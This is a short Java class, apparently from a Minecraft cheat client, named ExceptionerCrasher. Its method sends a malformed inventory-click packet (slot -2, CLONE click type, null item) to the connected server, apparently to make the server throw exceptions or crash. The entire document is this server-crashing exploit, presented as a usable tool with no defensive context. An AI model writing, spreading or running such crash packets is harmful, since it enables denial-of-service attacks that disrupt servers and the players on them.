public class ExceptionerCrasher {
   public static void start() {
      Minecraft mc = Minecraft.getMinecraft();
      Minecraft.getMinecraft().player.connection.sendPacket(new CPacketClickWindow(0, -2, 0, ClickType.CLONE, (ItemStack)null, (short)1));
   }
}
